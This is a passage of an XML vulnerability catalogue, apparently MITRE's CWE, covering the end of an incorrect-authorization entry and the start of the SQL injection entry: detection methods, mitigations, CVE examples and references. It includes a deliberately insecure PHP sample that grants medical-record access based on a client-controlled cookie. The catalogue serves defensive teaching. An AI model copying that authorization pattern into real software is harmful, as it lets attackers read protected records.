         <Background_Details>
            <Background_Detail>
               <Text>An access control list (ACL) represents who/what has permissions to a
						given object. Different operating systems implement (ACLs) in different
						ways. In UNIX, there are three types of permissions: read, write, and
						execute. Users are divided into three classes for file access: owner, group
						owner, and all other users where each class has a separate set of rights. In
						Windows NT, there are four basic types of permissions for files: "No
						access", "Read access", "Change access", and "Full control". Windows NT
						extends the concept of three types of users in UNIX to include a list of
						users and groups along with their associated permissions. A user can create
						an object (file) and assign specified permissions to that object.</Text>
            </Background_Detail>
         </Background_Details>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>AuthZ</Term>
               <Alternate_Term_Description>
                  <Text>"AuthZ" is typically used as an abbreviation of "authorization" within
							the web application security community. It is also distinct from
							"AuthC," which is an abbreviation of "authentication." The use of "Auth"
							as an abbreviation is discouraged, since it could be used for either
							authentication or authorization.</Text>
               </Alternate_Term_Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>A developer may introduce authorization weaknesses because of a lack of
						understanding about the underlying technologies. For example, a developer
						may assume that attackers cannot modify certain inputs such as headers or
						cookies.</Text>
            </Mode_of_Introduction>
            <Mode_of_Introduction>
               <Text>Authorization weaknesses may arise when a single-user application is
						ported to a multi-user environment.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Likelihood_of_Exploit>High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Read files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could read sensitive data, either by reading the data
							directly from a data store that is not correctly restricted, or by
							accessing insufficiently-protected, privileged functionality to read the
							data.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Modify files or
						directories</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could modify sensitive data, either by writing the data
							directly to a data store that is not correctly restricted, or by
							accessing insufficiently-protected, privileged functionality to write
							the data.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>An attacker could gain privileges by modifying or reading critical
							data directly, or by accessing privileged functionality.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-6">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated static analysis is useful for detecting commonly-used idioms
							for authorization. A tool may be able to analyze related configuration
							files, such as .htaccess in Apache web servers, or detect the usage of
							commonly-used authorization libraries.</Text>
                  <Text>Generally, automated static analysis tools have difficulty detecting
							custom authorization schemes. Even if they can be customized to
							recognize these schemes, they might not be able to tell whether the
							scheme correctly performs the authorization in a way that cannot be
							bypassed or subverted by an attacker.</Text>
               </Method_Description>
               <Method_Effectiveness>Limited</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated dynamic analysis may not be able to find interfaces that are
							protected by authorization checks, even if those checks contain
							weaknesses.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
                  <Text>Specifically, manual static analysis is useful for evaluating the
							correctness of custom authorization mechanisms.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules. However, manual efforts might not achieve desired code
							coverage within limited time constraints.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Host Application Interface Scanner</Text>
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                        <Text>Forced Path Execution</Text>
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Divide the software into anonymous, normal, privileged, and
							administrative areas. Reduce the attack surface by carefully mapping
							roles with data and functionality. Use role-based access control (RBAC)
							[R.863.1] to enforce the roles at the appropriate boundaries.</Text>
                  <Text>Note that this approach may not protect against horizontal
							authorization, i.e., it will not protect a user from attacking others
							with the same role.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that access control checks are performed related to the
							business logic. These checks may be different than the access control
							checks that are applied to more generic resources such as files,
							connections, processes, memory, and database records. For example, a
							database may restrict access for medical records to a specific database
							user, but each record might only be intended to be accessible to the
							patient and the patient's doctor [R.863.2].</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using authorization frameworks such as the JAAS
							Authorization Framework [R.863.4] and the OWASP ESAPI Access Control
							feature [R.863.5].</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For web applications, make sure that the access control mechanism is
							enforced correctly at the server side on every page. Users should not be
							able to access any unauthorized functionality or information by simply
							requesting direct access to that page.</Text>
                  <Text>One way to do this is to ensure that all pages containing sensitive
							information are not cached, and that all such pages restrict access to
							requests that are accompanied by an active and authenticated session
							token associated with a user who has the required permissions to access
							that page.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>System Configuration</Mitigation_Phase>
               <Mitigation_Phase>Installation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use the access control capabilities of your operating system and
							server environment and define your access control lists accordingly. Use
							a "default deny" policy when defining these ACLs.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code could be for a medical records application. It
						displays a record to already authenticated users, confirming the user's
						authorization using a value stored in a cookie. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$role = $_COOKIES['role'];</Code>
                     <Code>if (!$role) {</Code>
                     <Block>
                        <Code>$role = getRole('user');</Code>
                        <Code>if ($role) {</Code>
                        <Block>
                           <Code>// save the cookie to send out in future responses</Code>
                           <Code>setcookie("role", $role, time()+60*60*2);</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else{</Code>
                        <Block>
                           <Code>ShowLoginScreen();</Code>
                           <Code>die("\n");</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>if ($role == 'Reader') {</Code>
                     <Block>
                        <Code>DisplayMedicalHistory($_POST['patient_ID']);</Code>
                     </Block>
                     <Code>}</Code>
                     <Code>else{</Code>
                     <Block>
                        <Code>die("You are not Authorized to view this record\n");</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> The programmer expects that the cookie will only be set when
							getRole() succeeds. The programmer even diligently specifies a 2-hour
							expiration for the cookie. However, the attacker can easily set the
							"role" cookie to the value "Reader". As a result, the $role variable is
							"Reader", and getRole() is never invoked. The attacker has bypassed the
							authorization system.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-2213</Observed_Example_Reference>
               <Observed_Example_Description>Gateway uses default "Allow" configuration for its
						authorization settings.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2009-0034</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly interpret a
						configuration option for a system group, allowing users to gain
						privileges.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-6123</Observed_Example_Reference>
               <Observed_Example_Description>Chain: SNMP product does not properly parse a
						configuration option for which hosts are allowed to connect, allowing
						unauthorized IP addresses to connect.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-7109</Observed_Example_Reference>
               <Observed_Example_Description>Chain: reliance on client-side security (CWE-602)
						allows attackers to bypass authorization using a custom
						client.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3424</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly handle wildcards
						in an authorization policy list, allowing unintended
						access.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-4577</Observed_Example_Reference>
               <Observed_Example_Description>ACL-based protection mechanism treats negative
						access rights as if they are positive, allowing bypass of intended
						restrictions.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-6679</Observed_Example_Reference>
               <Observed_Example_Description>Product relies on the X-Forwarded-For HTTP header
						for authorization, allowing unintended access by spoofing the
						header.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2801</Observed_Example_Reference>
               <Observed_Example_Description>Chain: file-system code performs an incorrect
						comparison (CWE-697), preventing default ACLs from being properly
						applied.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2001-1155</Observed_Example_Reference>
               <Observed_Example_Description>Chain: product does not properly check the result
						of a reverse DNS lookup because of operator precedence (CWE-783), allowing
						bypass of DNS-based access restrictions.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Local_Reference_ID="R.863.1">
               <Reference_Author>NIST</Reference_Author>
               <Reference_Title>Role Based Access Control and Role Based
						Security</Reference_Title>
               <Reference_Link>http://csrc.nist.gov/groups/SNS/rbac/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.863.2">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 4, "Authorization" Page 114; Chapter 6, "Determining
						Appropriate Access Control" Page 171</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.863.3">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 5 - Improper Access Control
						(Authorization)</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-04</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/04/top-25-series-rank-5-improper-access-control-authorization/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-23" Local_Reference_ID="R.863.4">
               <Reference_Author>Rahul Bhattacharjee</Reference_Author>
               <Reference_Title>Authentication using JAAS</Reference_Title>
               <Reference_Link>http://www.javaranch.com/journal/2008/04/authentication-using-JAAS.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.863.5">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.863.6">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Common Vulnerabilities of Authorization", Page
						39.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2011-05-24</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
         </Content_History>
      </Weakness>
                    <Weakness ID="89" Name="Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')" Weakness_Abstraction="Base" Status="Draft">
         <Description>
            <Description_Summary>The software constructs all or part of an SQL command using
					externally-influenced input from an upstream component, but it does not
					neutralize or incorrectly neutralizes special elements that could modify the
					intended SQL command when it is sent to a downstream
					component.</Description_Summary>
            <Extended_Description>
               <Text>Without sufficient removal or quoting of SQL syntax in user-controllable
						inputs, the generated SQL query can cause those inputs to be interpreted as
						SQL instead of ordinary user data. This can be used to alter query logic to
						bypass security checks, or to insert additional statements that modify the
						back-end database, possibly including execution of system commands.</Text>
               <Text>SQL injection has become a common issue with database-driven web sites.
						The flaw is easily detected, and easily exploited, and as such, any site or
						software package with even a minimal user base is likely to be subject to an
						attempted attack of this kind. This flaw depends on the fact that SQL makes
						no real distinction between the control and data planes.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>864</Relationship_Target_ID>
               <!--2011 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>801</Relationship_Target_ID>
               <!--2010 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>943</Relationship_Target_ID>
               <!--Improper Neutralization of Special Elements in Data Query Logic--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>20</Relationship_Target_ID>
               <!--Improper Input Validation--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID>711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>722</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A1 - Unvalidated Input--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>727</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A6 - Injection Flaws--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">629</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>713</Relationship_Target_ID>
               <!--OWASP Top Ten 2007 Category A2 - Injection Flaws--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>751</Relationship_Target_ID>
               <!--2009 Top 25 - Insecure Interaction Between Components--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>810</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A1 - Injection--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>990</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Tainted Input to Command--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">928</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>929</Relationship_Target_ID>
               <!--OWASP Top Ten 2013 Category A1 - Injection--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>SQL injection can be resultant from special character mismanagement, MAID,
						or blacklist/whitelist problems. It can be primary to authentication
						errors.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="All"/>
            </Languages>
            <Technology_Classes>
               <Technology_Class Technology_Name="Database-Server"/>
            </Technology_Classes>
         </Applicable_Platforms>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
            <Introductory_Phase>Operation</Introductory_Phase>
         </Time_of_Introduction>
         <Modes_of_Introduction>
            <Mode_of_Introduction>
               <Text>This weakness typically appears in data-rich applications that save user
						inputs in a database.</Text>
            </Mode_of_Introduction>
         </Modes_of_Introduction>
         <Enabling_Factors_for_Exploitation>
            <Enabling_Factor_for_Exploitation>
               <Text>The application dynamically generates queries that contain user
						input.</Text>
            </Enabling_Factor_for_Exploitation>
         </Enabling_Factors_for_Exploitation>
         <Likelihood_of_Exploit>Very High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Technical_Impact>Read application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Since SQL databases generally hold sensitive data, loss of
							confidentiality is a frequent problem with SQL injection
							vulnerabilities.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If poor SQL commands are used to check user names and passwords, it
							may be possible to connect to a system as another user with no previous
							knowledge of the password.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If authorization information is held in a SQL database, it may be
							possible to change this information through the successful exploitation
							of a SQL injection vulnerability.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Integrity</Consequence_Scope>
               <Consequence_Technical_Impact>Modify application
						data</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>Just as it may be possible to read sensitive information, it is also
							possible to make changes or even delete this information with a SQL
							injection attack.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can often be detected using automated static analysis
							tools. Many modern tools use data flow analysis or constraint-based
							techniques to minimize the number of false positives.</Text>
                  <Text>Automated static analysis might not be able to recognize when proper
							input validation is being performed, leading to false positives - i.e.,
							warnings that do not have any security consequences or do not require
							any code changes.</Text>
                  <Text>Automated static analysis might not be able to detect the usage of
							custom API functions or third-party libraries that indirectly invoke SQL
							commands, leading to false negatives - especially if the API/library
							code is not available for analysis.</Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text>This is not a perfect solution, since 100% accuracy and coverage are
							not feasible.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method_Name>Automated Dynamic Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using dynamic tools and techniques that
							interact with the software using large test suites with many diverse
							inputs, such as fuzz testing (fuzzing), robustness testing, and fault
							injection. The software's operation may slow down, but it should not
							become unstable, crash, or generate incorrect results.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-9">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>Manual analysis can be useful for finding this weakness, but it might
							not achieve desired code coverage within limited time constraints. This
							becomes difficult for weaknesses that must be considered for all inputs,
							since the attack surface can be too large.</Text>
               </Method_Description>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Database Scanners</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Fuzz Tester</Text>
                        <Text>Framework-based Fuzzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
